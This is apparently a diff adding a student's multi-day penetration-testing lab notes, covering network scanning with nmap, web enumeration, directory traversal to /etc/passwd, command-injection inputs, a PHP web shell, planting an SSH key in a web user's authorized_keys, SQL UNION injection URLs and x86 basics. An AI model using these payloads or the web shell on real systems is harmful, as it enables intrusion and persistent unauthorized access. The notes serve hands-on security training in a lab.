@@ -1,3 +1,446 @@
+#Day 1 -- Exploit Resesearch
+id
+hostname
+
+Operation Systems Information
+cat /etc/os-release
+lsb_release -a
+
+Kernel Version
+uname -a
+hostnamectl
+
+#Day 1 -- Network Recon
+
+#Install python packages
+sudo apt-get install python-lxml python-requests python3-pip -y
+
+
+
+
+########## web.py ########## 
+import lxml.html     
+import requests
+
+page = requests.get('http://quotes.toscrape.com/page/2/')
+tree = lxml.html.fromstring(page.content)
+
+labels = tree.xpath('//a[@class="tag"]/text()')
+
+print ('STUFF: ',labels)
+########## web.py ########## 
+
+
+
+<span>by <small class="author" itemprop="author">Albert Einstein</small>
+
+<a class="tag" href="/tag/friends/page/1/">friends</a>
+
+
+
+Recon/Scanning
+1. Host Discovery (Ping Sweep)
+BASH:
+for i in {1..254} ;do (ping -c 1 192.168.65.$i | grep "bytes from" &) ;done
+
+https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/
+
+64 bytes from 192.168.65.1: icmp_seq=1 ttl=64 time=1.88 ms
+64 bytes from 192.168.65.3: icmp_seq=1 ttl=64 time=4.00 ms
+64 bytes from 192.168.65.10: icmp_seq=1 ttl=128 time=2.85 ms
+64 bytes from 192.168.65.20: icmp_seq=1 ttl=64 time=0.036 ms
+64 bytes from 192.168.65.30: icmp_seq=1 ttl=64 time=0.589 ms
+
+
+2. Host Enumeration (Port Scanning)
+nmap -Pn -T5 192.168.65.20 -p-
+-Pn = No host discovery
+-T0 to T5 = Speed
+
+Not shown: 65529 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5901/tcp open  vnc-1
+
+3. Host Interrogration (Service)
+nmap -Pn -T5 -sV 192.168.65.20 -p 21-23,80
+
+PORT   STATE SERVICE    VERSION
+21/tcp open  ftp        ProFTPD 1.3.5e
+22/tcp open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+23/tcp open  tcpwrapped
+80/tcp open  http       nginx 1.14.0 (Ubuntu
+
+
+NMAP NSE
+https://nmap.org/book/man-nse.html
+https://nmap.org/book/nse-usage.html#nse-categories
+
+cd /usr/share/nmap/scripts
+
+
+nmap -Pn -T5 --script=banner.nse 192.168.65.20 -p 21-23,80
+
+
+cat banner.nse
+categories = {"discovery", "safe"}
+
+nmap -Pn -T5 --script=discovery 192.168.65.20 -p 21-23,80
+
+
+nmap -Pn -T5 --script="discovery or safe" 192.168.65.20 -p 21-23,80
+
+nmap -Pn -T5 --script=ftp* 192.168.65.20 -p 21-23,80
+
+#Credential Reuse
+Credential = Logins, Usernames, Passwords
+Reuse = Again/Using it more than once
+#Day 2 - Web Exploitation (Enum/Exploit)
+
+Recon/Scanning
+1. Host Discovery (ping sweep)
+2. Host Enumeration (port scanning)
+3. Host Interrogation (services)
+
+HTTP Request Message -  Request Line
+GET / HTTP/1.1
+GET = Requesting/Retrieving
+POST = Sending Information
+(GET <===, POST<===, PUT, HEAD)
+
+/ = Top level domain
+www.google.com/
+
+www.google.com/maps
+/maps
+
+HTTP/1.1 = HTTP Version
+
+
+HTTP Response Message - Status Line
+HTTP/1.1 200 OK
+
+HTTP/1.1 = HTTP Version
+200 = 2|00
+2= Successful
+00 = OK
+
+404 = 4|04
+4 = Client Error
+04 = Not Found
+
+#List of Status Codes
+https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
+
+#Demo - Dev Console
+Console Tab
+
+Code:
+function Stuff() {
+code stuff here
+}
+
+Stuff();
++
+
+curl "https://quotes.toscrape.com/" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Referer: https://www.google.com/" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: cross-site" -H "Sec-Fetch-User: ?1"
+
+
+#HTML
+-HTML = Frame of the webpage/house
+-CSS = Drywall/Paint/Templates
+-Javascript = Scripts/Functions/Interactions
+
+http://10.50.41.203/webexample/htmldemo.html<title>Page Title </title>
+
+<img src="shutterstock_246695119_1080.jpg" height="500" width="500">
+
+<! Notice anything wrong with the button?  Oh and this is a comment>
+
+Javascript = <script> </script>
+
+<script>
+function myFunction() {
+document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
+
+<script> </script = Javascript
+function myFunction() = Defining function, name of function is myFunction
+document = Specifies the HTML document
+getElementById("demo") = element named id w/ value of demo
+innerHTML = The strings between the html tags
+
+
+ex. <small class="cosc">hello</small>
+small = html tag
+class = element name class w/ the value of cosc
+
+
+<small id="demo">hello</small>
+<small id="demo">Paragraph changed.</small>
+
+#Java demo
+http://10.50.41.203/java/Javademo.html
+
+<script>
+function changeText() {
+  x = document.getElementById("mySelect");
+  x.options[x.selectedIndex].text = "Melon";
+}
+</script>
+
+<script> </script = Javascript HTML tags
+function changeText() = Function named changeText()
+
+x = document.getElementById("mySelect");
+x = variable
+document = html document
+getElementById = Id="mySelect"
+
+x.options[x.selectedIndex].text = "Melon";
+x.options = 
+  <option>Apple</option>
+  <option>Orange</option>
+  <option>Pineapple</option>
+  <option>Banana</option>
+  
+  selectedIndex = Selected item
+
+
+#Recon Scanning
+1. Host Discovery (ping sweep)
+ping 10.50.41.203
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+
+Results:
+64 bytes from 10.50.41.203: icmp_seq=2 ttl=62 time=2.30 ms
+
+2. Host Enumeration (port scanning)
+nmap -Pn -T5 10.50.41.203 -p-
+
+Results:
+Nmap scan report for 10.50.41.203
+Host is up (0.0019s latency).
+Not shown: 65530 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+3389/tcp closed ms-wbt-server
+8080/tcp closed http-proxy
+9999/tcp closed abyss
+
+3. Host Interrogation (services)
+nmap -Pn -T5 -sV 10.50.41.203 -p 22,80
+
+Results:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+nmap -Pn -T5 --script=banner.nse 10.50.41.203 -p 22,80
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
+
+
+nc 10.50.41.203 22
+SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5
+
+
+Facts:
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+
+
+#Web Enumeration
+1. Scanning
+cd /usr/share/nmap/scripts/
+ls | grep http
+
+http-enum.nse
+http-robots.txt.nse
+
+nmap -Pn -T5 --script=http-enum.nse 10.50.41.203 -p 80
+
+Results:
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /robots.txt: Robots file
+|   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+
+nmap -Pn -T5 --script=http-robots.txt.nse 10.50.41.203 -p 80
+
+Results:
+PORT   STATE SERVICE
+80/tcp open  http
+| http-robots.txt: 2 disallowed entries
+|_/cross /
+
+/robots.txt <=== legit
+/java/ <=== legit
+/path/ <=== legit
+/uploads/ <=== legit
+/cross/ <=== legit
+/
+
+2. Robots.txt
+http://10.50.41.203/robots.txt
+
+User-agent: *
+Allow: /uploads
+Allow: /chat
+Allow: /cmdinjection
+Allow: /java
+Allow: /path
+Allow: /webexample
+Disallow: /cross
+Disallow: /
+
+3. Legitmite Surfing
+/robots.txt <=== legit
+/java/ <=== legit
+/path/ <=== legit
+/uploads/ <=== legit
+/cross/ <=== legit
+/chat/ <=== legit
+/webexample/ <=== legit
+/
+
+#Web Exploitation
+
+1. Directory Traversal - Info
+http://10.50.41.203/path/pathdemo.php
+../../../../../../../../../../etc/passwd
+
+/etc/passwd
+/etc/group
+/etc/hosts
+/etc/networks
+/etc/resolv.conf
+/etc/os-release
+
+cd <= Linux takes you to ~
+cd .. <= Windows takes you up 1 level
+
+
+http://10.50.41.203/path/pathdemo.php?myfile=asfasdfas&submit=File+look+up
+
+Network Tab > Headers Tab> Query String Parameters
+myfile <=== Parameter
+	asfasdfas
+submit <=== Parameter
+	File look up
+	
+
+http://10.50.41.203/path/pathdemo.php
+http://10.50.41.203/path/pathdemo.php?
+? = Query String Paramters
+http://10.50.41.203/path/pathdemo.php?myfile
+http://10.50.41.203/path/pathdemo.php?myfile=
+http://10.50.41.203/path/pathdemo.php?myfile=../../../../../../../../../../etc/passwd
+
+
+2. Command Injection - Info/Access
+http://10.50.41.203/cmdinjection/cmdinjectdemo.php
+
+../../../../../../../../../etc/passwd
+
+; id
+; whoami
+
+
+3. Web Shell - Info/Access
+
+Conditions:
+1. Can you upload? Yes
+2. Is your uploads being sanitized? No 
+3. Can you access the uploads directory? Yes
+
+###### webshell.php ######
+<HTML><BODY>
+<Form METHOD="GET" NAME="badform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="hello">
+</Form>
+<?php system($_GET['cmd']);?>
+</BODY></HTML>
+###### webshell.php ######
+
+10.50.41.203/
+
+id
+whoami
+
+
+2a(CmdInj)/3a(WebShell). SSH Keys - Access
+
+1. Determine who the user is
+id
+who
+
+User: www-data
+
+2. Determine user's home directory
+cat /etc/passwd
+
+www-data:x:33:33:www-data:/var/www:/bin/bash
+
+www-data = user
+/var/www = www-data's home directory
+/bin/bash = login shell
+
+3. Generate SSH keys from the workstation you will login from
+
+ssh-keygen -t rsa -b 4096
+[Enter]
+[Y] to Overwrite
+[Enter]
+[Enter]
+
+cd /home/student/.ssh/
+
+ls
+id_rsa = Private
+id_rsa.pub = Public key <=== Key to be uploaded on target machine
+
+cat id_rsa.pub
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2kz6J3pZzstGmtzpMUY9H/Y5uWT/8ATo3yvnqiat1vsf3Io8VNaCoXeP3DSYIou9OaT6gMIsmypBbO5oMUZcnsuLWS7Vki7hKqbKrkpCKVrsLjO/GARGEiUAN9jOmH5bQUJx24DZyJEMOsCD9mfZSHZxhEjg0Pq8klQcQSi1mldPsA4z28rNk6cear4pMddk26v06BlVdmg5etKYgHVLdW/E8mOtTQPS8H1sbOZaRckH07/trMjSv7UgsFJ+rWQr6VS1h2/xf2hnYu0OPrI3tn9/4Awsbw2PXiAEKUxDVWRZ5cJR6ki5A+EisSWBSCRlKC948SYkCpFhlExByDuRLeji1LofNY3D9xhzPdKEFXx6x2lFEtwM19mCo/CPVpJej6cHFF0Pz2/iNZCT27aZ87RUasrjHQB8L+x0JE3yqhj8xHHMXzQgVeDn88O4vyogmA9kjb9FVnymwVADkT/7JgdgQeuftdb/DO7WIlK4bwdcd04XPK0TOWn4SJtlFqJxMC5lBJiPZiGIro4KLsj5R2HGs7FkFf2oUCAbfh06/IrBt8XtIfBZHW8qB/oNYNRWKKpfwMS4jIJwRKUwIqOq6lyUO3xP29Bf7P+blmsjbriPpzI04hA1djMR1yxG+DFLGX7HLSEdBQX/m3Kn1vqY3aQArCWtxc0AP6O58V9fkDQ== student@lin-ops
+
+
+4. On the Target Machine, validate directories
+Validate .ssh/ exist in the user's home directory
+ls -la /var/www
+
+drwxrwxr-x  3 root www-data 4096 Jul 27 01:42 .
+drwxr-xr-x 14 root root     4096 Jul 27 01:42 ..
+drwxr-xr-x  9 root root     4096 Jul 27 01:46 html
+
+mkdir /var/www/.ssh
+ls -la /var/www
+
+5. Upload SSH key to authorized_keys file
+echo "" > /var/www/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2kz6J3pZzstGmtzpMUY9H/Y5uWT/8ATo3yvnqiat1vsf3Io8VNaCoXeP3DSYIou9OaT6gMIsmypBbO5oMUZcnsuLWS7Vki7hKqbKrkpCKVrsLjO/GARGEiUAN9jOmH5bQUJx24DZyJEMOsCD9mfZSHZxhEjg0Pq8klQcQSi1mldPsA4z28rNk6cear4pMddk26v06BlVdmg5etKYgHVLdW/E8mOtTQPS8H1sbOZaRckH07/trMjSv7UgsFJ+rWQr6VS1h2/xf2hnYu0OPrI3tn9/4Awsbw2PXiAEKUxDVWRZ5cJR6ki5A+EisSWBSCRlKC948SYkCpFhlExByDuRLeji1LofNY3D9xhzPdKEFXx6x2lFEtwM19mCo/CPVpJej6cHFF0Pz2/iNZCT27aZ87RUasrjHQB8L+x0JE3yqhj8xHHMXzQgVeDn88O4vyogmA9kjb9FVnymwVADkT/7JgdgQeuftdb/DO7WIlK4bwdcd04XPK0TOWn4SJtlFqJxMC5lBJiPZiGIro4KLsj5R2HGs7FkFf2oUCAbfh06/IrBt8XtIfBZHW8qB/oNYNRWKKpfwMS4jIJwRKUwIqOq6lyUO3xP29Bf7P+blmsjbriPpzI04hA1djMR1yxG+DFLGX7HLSEdBQX/m3Kn1vqY3aQArCWtxc0AP6O58V9fkDQ== student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+6. Confirm SSH Key Upload
+cat /var/www/.ssh/authorized_keys
+
+7. Login 
+ssh www-data@10.50.41.203
 #Day 3 - SQL
 
 mysql
@@ -458,3 +901,100 @@ http://10.50.21.1/uniondemo.php?Selection=2 UNION select 1,2,3; #
 http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns; #
 
 http://10.50.21.1/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns WHERE table_schema='session'; #
+
+Day 4 - Reverse Engineering 1/3
+
+Resources > Lesson Resources
+-x86 Student Guide
+-Reverse_engineering_workflow
+
+Reverse Engineering Workflow
+0. Getting the program/binary in test environment
+1. Static Analysis 
+2. Behavior Analysis
+3. Dynamic Analysis 
+4. Reverse Engineering
+-Decompiler
+-Disassembler
+
+High Level Language: C, C+, Python
+
+Source Code > Compiler > Program > Decompiler/Disassembler > Read Low Level Language/Decompiler
+
+Low Level Language: Assembly
+
+x86 Intel Architecture
+
+Assembly Instructions
+
+Int Operand
+Int Operand1, Operand2
+
+Operand: 
+-0x3 (value)
+-eax, ebx, ecx (register)
+esp: stack pointer, moves dynamically
+ebp: base pointer
+eax: first return register
+eip: instruction pointer
+e/flags register: zero flag, carry flag, sign flag; will set/turn on certains flags depending on the results of the previous instruction
+
+#Ref - FLAGS Register:
+https://en.wikipedia.org/wiki/FLAGS_register
+
+zero flag: set if operation results in 0
+carry flag: set if operation results in large or small value
+sign flag: set if operation results in negative
+
+e = represents 32-bit
+
+-0x50001220 (memory address)
+
+
+Assembly Instruction:
+-Data storage/movement
+mov
+lea
+
+mov operand1,operand2
+mov dst,src
+
+mov eax,16
+
+eax=16
+
+-Arithmetic
+add
+sub
+inc
+dec
+mul
+div
+
+-Logic
+or
+and
+shr
+shl
+
+-Stack
+pop
+push
+call
+ret
+
+-Control-Flow
+test
+cmp
+jmp
+jcc (jump if condition is met)
+
+
+------------------------------------------------------------------
+Step by step operations
+
+Recon: view map and record given information
+       tunnel into Jump Box: ssh localhost -L 31301:JUMPIP:22 -NT
+       dynamic tunnel set up: ssh localhost -p 31301 -D 9040 -NT
+       enter the jumpbox to sweep the network: ssh localhost -p 
+       
